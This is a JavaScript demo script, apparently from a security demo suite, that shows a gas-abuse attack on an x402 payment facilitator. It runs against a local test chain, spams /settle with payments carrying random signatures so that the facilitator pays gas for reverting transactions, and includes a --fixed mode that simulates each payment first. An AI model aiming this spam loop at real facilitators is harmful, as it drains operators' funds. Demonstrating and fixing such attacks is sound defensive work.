// Attack #4: the facilitator pays the gas, and settles whatever it is handed
// without a dry run. Junk payloads revert on chain, and the facilitator pays.
//   node demos/04-gas.mjs           blind settlement
//   node demos/04-gas.mjs --fixed   simulate first, refuse anything that would revert
import { startChain, stopChain, setup, roles, pub, parseUnits } from "../lib/chain.mjs";
import { createFacilitator } from "../lib/facilitator.mjs";
import { toHex, formatEther, parseGwei } from "viem";
import { randomBytes } from "node:crypto";
import { session } from "../lib/term.mjs";

const fixed = process.argv.includes("--fixed");
const N = 30;
const t = session(fixed ? "x402-gas-fixed" : "x402-gas", "Gas abuse");
await startChain();
const { usdc } = await setup();
const fac = createFacilitator({ usdc, simulate: fixed, gasPrice: parseGwei("30") }); await fac.listen();
const eth = () => pub.getBalance({ address: roles.facilitator.address });
const start = await eth();
t.cmd(`node spam-settle.mjs --count ${N}`);
t.note("each request: a well-formed payment with a signature from nobody, sent straight to /settle");
for (let i = 0; i < N; i++) {
  const now = Math.floor(Date.now() / 1000);
  const payment = { payload: { signature: toHex(randomBytes(64)) + "1b", authorization: { from: roles.victims[0].address, to: roles.attacker.address, value: String(parseUnits("1", 6)), validAfter: String(now - 60), validBefore: String(now + 600), nonce: toHex(randomBytes(32)) } } };
  const r = await fetch(fac.url + "/settle", { method: "POST", body: JSON.stringify({ payment }) }).then((x) => x.json());
  const spent = start - (await eth());
  t.tick("gas", `  request ${String(i + 1).padStart(2)}/${N}   ${r.reason ?? "settled"}   facilitator gas spent: ${formatEther(spent)} ETH`);
}
t.end();
t.big(`ATTACKER PAID: 0 ETH    FACILITATOR PAID: ${formatEther(start - (await eth()))} ETH    reverted txs: ${fac.stats.reverted}`);
t.save(); await fac.close(); stopChain(); process.exit(0);
